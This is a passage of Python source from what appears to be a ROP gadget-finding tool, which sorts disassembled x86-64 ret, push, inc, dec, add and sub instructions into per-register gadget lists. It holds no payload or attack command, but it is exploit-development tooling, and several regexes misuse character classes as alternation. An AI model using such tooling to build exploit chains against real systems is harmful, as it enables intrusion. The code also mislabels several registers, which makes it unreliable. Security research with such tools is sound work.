			elif re.match( r'^push [qword|dword]+ ptr \[r15', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.hgPushQwordR15)
			else:
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbp", fg.hgPushQwordOther)

	def do64_ret(self, name: str, testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		# dp ("do_ret")
		check1=raw.hex()+hex(saveq)
		do = f"do64_ret_s"
		if (check1) not in fg.junkBox64:
			if hasattr(self, do) and callable(func := getattr(self, do)):
				# dp ("do func ret single-pre", hex(offL[lGoBack]))
				obj=func(testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2)
				# dp ("do func ret single", hex(offL[lGoBack]))
				fg.junkBox64.add(check1)

	def do64_retC2(self, name: str, testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		dp("do64_retc2")
		check1=raw.hex()+hex(saveq)
		do = f"do64_ret_sC2"
		if (check1) not in fg.junkBox64:
			if hasattr(self, do) and callable(func := getattr(self, do)):
				# dp ("do func ret single-pre", hex(offL[lGoBack]))
				obj=func(testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2)
				# dp ("do func ret single", hex(offL[lGoBack]))
				fg.junkBox64.add(check1)

	def do64_ret_s(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		addGadgetNoCheck(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.ret64)
		
		# dp ("done", len(fg.ret))
	def do64_ret_sC2(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		addGadgetNoCheck(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.retC264)
		
	def do64_push(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):	
		if "ptr" not in testVal:
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.push64)
			if re.match( r'^push [er]*a[x|l|h]+',testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rax", fg.pushRAX)
			elif re.match( r'^push [er]*b[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbx", fg.pushRBX)
			elif re.match( r'^push [er]*c[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rcx", fg.pushRCX)
			elif re.match( r'\bpush ebp\b', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbp", fg.pushRBP)
			elif re.match( r'\bpush esp\b',testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsp", fg.pushRSP)
			elif re.match( r'^push [er]*d[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.pushRDX)
			elif re.match( r'\bpush edi\b', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdi", fg.pushRDI)
			elif re.match( r'\bpush esi\b', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsi", fg.pushRSI)
			elif re.match( r'^push r8', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.pushR8)
			elif re.match( r'^push r9', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.pushR9)
			elif re.match( r'^push r10', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.pushR10)
			elif re.match( r'^push r11', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.pushR11)
			elif re.match( r'^push r12', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.pushR12)
			elif re.match( r'^push r13', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.pushR13)
			elif re.match( r'^push r14', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.pushR14)
			elif re.match( r'^push r15', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.pushR15)
			elif re.match( r'\bpush [-0x]*[0-9a-f]+\b', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsi", fg.pushConstant64)
			# elif re.match( r'\bpush [qword|dword]+ ptr\b', testVal, re.M|re.I):
			# 	addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsi", fg.pushQword)
			else:
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.pushOther64)
						# def disMini(CODED2, address, offset):
			# test=disMini(raw, address, offset)
		elif "gs:[r" in testVal or "gs:[0xc0]" in testVal:
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbp", fg.pushQwordGS)
			if "rax" in testVal:
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbp", fg.pushQwordGSRAX)
			elif "rbx" in testVal:
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbp", fg.pushQwordGSRBX)
			elif "rcx" in testVal:
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbp", fg.pushQwordGSRCX)
			elif "rdx" in testVal:
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbp", fg.pushQwordGSRDX)
			elif "rdi" in testVal:
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbp", fg.pushQwordGSRDI)
			elif "rsi" in testVal:
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbp", fg.pushQwordGSRSI)
			elif "rbp" in testVal:
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbp", fg.pushQwordGSRBP)
			elif "r8" in testVal:
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbp", fg.pushQwordGSR8)
			elif "r9" in testVal:
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbp", fg.pushQwordGSR9)
			elif "r10" in testVal:
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbp", fg.pushQwordGSR10)
			elif "r11" in testVal:
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbp", fg.pushQwordGSR11)
			elif "r12" in testVal:
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbp", fg.pushQwordGSR12)
			elif "r13" in testVal:
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbp", fg.pushQwordGSR13)				
			elif "r14" in testVal:
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbp", fg.pushQwordGSR14)				
			elif "r15" in testVal:
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbp", fg.pushQwordGSR15)				
		else:
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.pushQword64)
			if re.match( r'^push [qword|dword]+ ptr \[[er]*a[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rax", fg.pushQwordRAX)
			elif re.match( r'^push [qword|dword]+ ptr \[[er]*b[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbx", fg.pushQwordRBX)
			elif re.match( r'^push [qword|dword]+ ptr \[[er]*c[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rcx", fg.pushQwordRCX)
			elif re.match( r'^push [qword|dword]+ ptr \[[er]*d[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.pushQwordRDX)
			elif re.match( r'^push [qword|dword]+ ptr \[[er]*si', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsi", fg.pushQwordRSI)
			elif re.match( r'^push [qword|dword]+ ptr \[[er]*di', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdi", fg.pushQwordRDI)
			elif re.match( r'^push [qword|dword]+ ptr \[[er]*sp', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsp", fg.pushQwordRSP)
			elif re.match( r'^push [qword|dword]+ ptr \[[er]*bp', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbp", fg.pushQwordRBP)
			elif re.match( r'^push [qword|dword]+ ptr \[r8', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.pushQwordR8)
			elif re.match( r'^push [qword|dword]+ ptr \[r9', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.pushQwordR9)
			elif re.match( r'^push [qword|dword]+ ptr \[r10', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.pushQwordR10)
			elif re.match( r'^push [qword|dword]+ ptr \[r11', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.pushQwordR11)
			elif re.match( r'^push [qword|dword]+ ptr \[r12', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.pushQwordR12)
			elif re.match( r'^push [qword|dword]+ ptr \[r13', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.pushQwordR13)
			elif re.match( r'^push [qword|dword]+ ptr \[r14', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.pushQwordR14)
			elif re.match( r'^push [qword|dword]+ ptr \[r15', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.pushQwordR15)
			elif "gs:[e" in testVal or "gs:[0xc0]" in testVal:
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbp", fg.pushQwordGS)
			else:
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbp", fg.pushQwordOther)

	def do64_inc(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.inc64)
		if re.match( r'\binc [re]+si\b', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rax", fg.incRSI)
		elif re.match( r'\binc [re]+bp\b', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbp", fg.incRBP)
		elif re.match( r'\binc [re]+di\b', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdi", fg.incRDI)
		elif re.match( r'^inc [re]+ax',testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rax", fg.incRAX)
		elif re.match( r'^inc [re]+bx', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbx", fg.incRBX)
		elif re.match( r'\binc [re]+sp\b',testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsp", fg.incRSP)	
		elif re.match( r'^inc [re]+cx', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rcx", fg.incRCX)
		elif re.match( r'^inc [re]+dx', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.incRDX)
		elif re.match( r'^inc r8', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.incR8)
		elif re.match( r'^inc r9', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.incR9)
		elif re.match( r'^inc r10', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.incR10)
		elif re.match( r'^inc r11', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.incR11)
		elif re.match( r'^inc r12', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.incR12)
		elif re.match( r'^inc r13', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.incR13)
		elif re.match( r'^inc r14', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.incR14)
		elif re.match( r'^inc r15', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.incR15)			

	def do64_dec(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.dec64)
		if re.match( r'\bdec esi\b', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rax", fg.decRSI)
		elif re.match( r'\bdec ebp\b', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbp", fg.decRBP)
		elif re.match( r'\bdec edi\b', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdi", fg.decRDI)
		elif re.match( r'^dec eax',testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rax", fg.decRAX)
		elif re.match( r'^dec ebx', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbx", fg.decRBX)
		elif re.match( r'\bdec esp\b',testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsp", fg.decRSP)	
		elif re.match( r'^dec ecx', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rcx", fg.decRCX)
		elif re.match( r'^dec edx', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.decRDX)
		elif re.match( r'^dec r8', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.decR8)
		elif re.match( r'^dec r9', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.decR9)
		elif re.match( r'^dec r10', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.decR10)
		elif re.match( r'^dec r11', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.decR11)
		elif re.match( r'^dec r12', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.decR12)
		elif re.match( r'^dec r13', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.decR13)
		elif re.match( r'^dec r14', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.decR14)
		elif re.match( r'^dec r15', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.decR15)
	
	def do64_adc(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		self.do64_add(testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL,  op_strL, c2)

	def do64_add(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		if not re.match( r'^[add|adc]+ [qword|dword]+ ptr \[eax\], eax|[add|adc]+ [qword|dword]+ ptr \[ebx\], ebx|[add|adc]+ [qword|dword]+ ptr \[ecx\], ecx|[add|adc]+ [qword|dword]+ ptr \[edx\], edx|[add|adc]+ [qword|dword]+ ptr \[esi\], esi|[add|adc]+ [qword|dword]+ ptr \[edi\], edi|[add|adc]+ [qword|dword]+ ptr \[ebp\], ebp|[add|adc]+ [qword|dword]+ ptr \[esp\], esp|[add|adc]+ [byte|word|dword]+ ptr \[eax\], al|[add|adc]+ [byte|word|dword]+ ptr \[ebx\], bl|[add|adc]+ [byte|word|dword]+ ptr \[ecx\], cl|[add|adc]+ [byte|word|dword]+ ptr \[edx\], dl|[add|adc]+  [byte|word|dword]+ ptr \[eax ]+ eax\], al|[add|adc]+  [byte|word|dword]+ ptr \[ebx \+ ebx\], bl|[add|adc]+  [byte|word|dword]+ ptr \[ecx \+ ecx\], cl|[add|adc]+  [byte|word|dword]+ ptr \[edx \+ edx\], dl|[add|adc]+ [byte|word|dword]+ ptr \[e[abcdxsdbpi]+ [\+|\-]+ e[abcdxsdbpi]+\]|[add|adc]+ [byte|word|dword]+ ptr \[e[abcdxsdbpi]+ [\+|\-]+ e[abcdxsdbpi]+ [\+|\-]+ e[abcdxsdbpi]+\]|[add|adc]+ [byte|word|dword]+ ptr \[e[abcdxsdbpi]+ [\+|\-]+ e[abcdxsdbpi]+ [\+|\-]+ 0x', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.add64)
			if "ptr" not in testVal:
				if re.match( r'^[add|adc]+ [er]*a[x|l|h]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rax", fg.addRAX)
				elif re.match( r'^[add|adc]+ [er]*b[x|l|h]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbx", fg.addRBX)
				elif re.match( r'^[add|adc]+ [er]*c[x|l|h]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rcx", fg.addRCX)
				elif re.match( r'^[add|adc]+ [er]*sp', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsp", fg.addRSP)
					if re.match( r'^[add|adc]+ [er]*sp, [0]*[x]*[1-90a-f]+', testVal, re.M|re.I):
						if not re.match( r'^[add|adc]+ [er]*sp, e', testVal, re.M|re.I):
							addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsp", fg.addRSPVal)
				elif re.match( r'^[add|adc]+ [er]*bp', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbp", fg.addRBP)
				elif re.match( r'^[add|adc]+ [er]*d[x|l|h]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.addRDX)
				elif re.match( r'^[add|adc]+ [er]*di', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdi", fg.addRDI)
				elif re.match( r'^[add|adc]+ [er]*si', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsi", fg.addRSI)
				elif re.match( r'^[add|adc]* r8', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.addR8)
				elif re.match( r'^[add|adc]* r9', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.addR9)
				elif re.match( r'^[add|adc]* r10', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.addR10)
				elif re.match( r'^[add|adc]* r11', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.addR11)
				elif re.match( r'^[add|adc]* r12', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.addR12)
				elif re.match( r'^[add|adc]* r13', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.addR13)
				elif re.match( r'^[add|adc]* r14', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.addR14)
				elif re.match( r'^[add|adc]* r15', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.addR15)
			else:
			#### qWORDS
				if re.match( r'^[add|adc]+ [dword|qword|byte|word]+ [ptr]* \[[er]*a[x|l|h]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rax", fg.addQwordRAX)
				elif re.match( r'^[add|adc]+ [dword|qword|byte|word]+ [ptr]* \[[er]*b[x|l|h]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbx", fg.addQwordRBX)
				elif re.match( r'^[add|adc]+ [dword|qword|byte|word]+ [ptr]* \[[er]*c[x|l|h]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rcx", fg.addQwordRCX)
				elif re.match( r'^[add|adc]+ [dword|qword|byte|word]+ [ptr]* \[[er]*sp', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsp", fg.addQwordRSP)
				elif re.match( r'^[add|adc]+ [dword|qword|byte|word]+ [ptr]* \[[er]*bp', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbp", fg.addQwordRBP)
				elif re.match( r'^[add|adc]+ [dword|qword|byte|word]+ [ptr]* \[[er]*d[x|l|h]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.addQwordRDX)
				elif re.match( r'^[add|adc]+ [dword|qword|byte|word]+ [ptr]* \[[er]*di', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdi", fg.addQwordRDI)
				elif re.match( r'^[add|adc]+ [dword|qword|byte|word]+ [ptr]* \[[er]*si', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsi", fg.addQwordRSI)
				elif re.match( r'^[add|adc]+ [dword|qword|byte|word]+ [ptr]* \[r8', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.addQwordR8)
				elif re.match( r'^[add|adc]+ [dword|qword|byte|word]+ [ptr]* \[r9', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.addQwordR9)
				elif re.match( r'^[add|adc]+ [dword|qword|byte|word]+ [ptr]* \[r10', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.addQwordR10)
				elif re.match( r'^[add|adc]+ [dword|qword|byte|word]+ [ptr]* \[r11', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.addQwordR11)
				elif re.match( r'^[add|adc]+ [dword|qword|byte|word]+ [ptr]* \[r12', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.addQwordR12)
				elif re.match( r'^[add|adc]+ [dword|qword|byte|word]+ [ptr]* \[r13', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.addQwordR13)
				elif re.match( r'^[add|adc]+ [dword|qword|byte|word]+ [ptr]* \[r14', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.addQwordR14)
				elif re.match( r'^[add|adc]+ [dword|qword|byte|word]+ [ptr]* \[r15', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.addQwordR15)
				if "gs:[r" in testVal or "gs:[0xc0]"  in testVal:
					if re.match( r'^[add|adc]+ [er]*[abcdsibpbx]+, [qword|dword]+ ptr [fg]+s', testVal, re.M|re.I):
						addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsp", fg.addGS)

	def do64_sub(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		if not re.match( r'^[sub|sbb]+ [qword|dword]+ ptr \[eax\], eax|[sub|sbb]+ [qword|dword]+ ptr \[ebx\], ebx|[sub|sbb]+ [qword|dword]+ ptr \[ecx\], ecx|[sub|sbb]+ [qword|dword]+ ptr \[edx\], edx|[sub|sbb]+ [qword|dword]+ ptr \[esi\], esi|[sub|sbb]+ [qword|dword]+ ptr \[edi\], edi|[sub|sbb]+ [qword|dword]+ ptr \[ebp\], ebp|[sub|sbb]+ [qword|dword]+ ptr \[esp\], esp|[sub|sbb]+ [byte|word|dword]+ ptr \[eax\], al|[sub|sbb]+ [byte|word|dword]+ ptr \[ebx\], bl|[sub|sbb]+ [byte|word|dword]+ ptr \[ecx\], cl|[sub|sbb]+ [byte|word|dword]+ ptr \[edx\], dl|[sub|sbb]+  [byte|word|dword]+ ptr \[eax ]+ eax\], al|[sub|sbb]+  [byte|word|dword]+ ptr \[ebx \+ ebx\], bl|[sub|sbb]+  [byte|word|dword]+ ptr \[ecx \+ ecx\], cl|[sub|sbb]+  [byte|word|dword]+ ptr \[edx \+ edx\], dl|[sub|sbb]+ [byte|word|dword]+ ptr \[e[abcdxsdbpi]+ [\+|\-]+ e[abcdxsdbpi]+\]|[sub|sbb]+ [byte|word|dword]+ ptr \[e[abcdxsdbpi]+ [\+|\-]+ e[abcdxsdbpi]+ [\+|\-]+ e[abcdxsdbpi]+\]|[sub|sbb]+ [byte|word|dword]+ ptr \[e[abcdxsdbpi]+ [\+|\-]+ e[abcdxsdbpi]+ [\+|\-]+ 0x', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.sub64)

			if "qword" not in testVal:
				if re.match( r'[sub|sbb]+ [er]*a[x|l|h]', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rax", fg.subRAX)
				elif re.match( r'[sub|sbb]+ [er]*b[x|l|h]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbx", fg.subRBX)
				elif re.match( r'[sub|sbb]+ [er]*c[x|l|h]*', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rcx", fg.subRCX)
				elif re.match( r'[sub|sbb]+ [er]*d[x|l|h]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.subRDX)
				elif re.match( r'^[sub|sbb]+ [er]*si', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsi", fg.subRSI)
				elif re.match( r'^[sub|sbb]+ [er]*di', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdi", fg.subRDI)
				elif re.match( r'^[sub|sbb]+ [er]*sp', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsp", fg.subRSP)
				elif re.match( r'^[sub|sbb]+ [er]*bp', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbp", fg.subRBP)
				elif re.match( r'^[sub|sbb]+ r8[bdw]*', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.subR8)
				elif re.match( r'^[sub|sbb]+ r9[bdw]*', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.subR9)
				elif re.match( r'^[sub|sbb]+ r10[bdw]*', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.subR10)
				elif re.match( r'^[sub|sbb]+ r11[bdw]*', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.subR11)
				elif re.match( r'^[sub|sbb]+ r12[bdw]*', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.subR12)
				elif re.match( r'^[sub|sbb]+ r13[bdw]*', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.subR13)
				elif re.match( r'^[sub|sbb]+ r14[bdw]*', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.subR14)
